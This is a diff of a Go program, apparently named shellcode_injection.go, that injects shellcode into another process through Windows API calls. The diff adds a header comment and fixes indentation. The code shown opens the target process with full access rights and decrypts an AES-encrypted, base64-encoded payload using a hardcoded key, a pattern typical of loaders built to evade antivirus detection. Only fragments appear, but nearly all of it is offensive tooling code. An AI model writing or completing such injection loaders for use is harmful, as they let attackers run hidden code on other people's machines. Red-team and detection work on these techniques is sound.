@@ -1,3 +1,6 @@
+// shellcode_injection.go injects shellcode payloads into a specified process using direct Windows API calls,
+// demonstrating methods for memory allocation, process manipulation, and remote thread creation
+
 package main
 
 import (
@@ -42,7 +45,7 @@ func main() {
 	dwPID, _ = strconv.Atoi(os.Args[1])
 	fmt.Printf("[*] trying to get a handle to the process (%d)\n", dwPID)
 
-    hProcess, _, err := openProcess.Call(ptr(PROCESS_ALL_ACCESS), ptr(false), ptr(dwPID))
+	hProcess, _, err := openProcess.Call(ptr(PROCESS_ALL_ACCESS), ptr(false), ptr(dwPID))
 	if hProcess == 0 {
 		fmt.Printf("[-] failed to get a handle to the process, error: %v - %d\n", err, err)
 		return
@@ -91,30 +94,30 @@ func main() {
 
 func decryptShellcode(encodedCipherText []byte) ([]byte, error) {
 	cipherText := make([]byte, base64.StdEncoding.DecodedLen(len(encodedCipherText)))
-    n, err := base64.StdEncoding.Decode(cipherText, encodedCipherText)
-    if err != nil {
-        return nil, err
-    }
-    cipherText = cipherText[:n]
+	n, err := base64.StdEncoding.Decode(cipherText, encodedCipherText)
+	if err != nil {
+		return nil, err
+	}
+	cipherText = cipherText[:n]
 
-    key := []byte("supersecretkey12")
-    iv := []byte("16byteivstring12")
+	key := []byte("supersecretkey12")
+	iv := []byte("16byteivstring12")
 
-    block, err := aes.NewCipher(key)
-    if err != nil {
-        return nil, err
-    }
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
 
-    mode := cipher.NewCBCDecrypter(block, iv)
+	mode := cipher.NewCBCDecrypter(block, iv)
 
-    decrypted := make([]byte, len(cipherText))
-    mode.CryptBlocks(decrypted, cipherText)
+	decrypted := make([]byte, len(cipherText))
+	mode.CryptBlocks(decrypted, cipherText)
 
-    padLen := int(decrypted[len(decrypted)-1])
-    if padLen > aes.BlockSize || padLen > len(decrypted) {
-        return nil, fmt.Errorf("invalid padding length")
-    }
-    return decrypted[:len(decrypted)-padLen], nil
+	padLen := int(decrypted[len(decrypted)-1])
+	if padLen > aes.BlockSize || padLen > len(decrypted) {
+		return nil, fmt.Errorf("invalid padding length")
+	}
+	return decrypted[:len(decrypted)-padLen], nil
 }
 
 func ptr(val interface{}) uintptr {
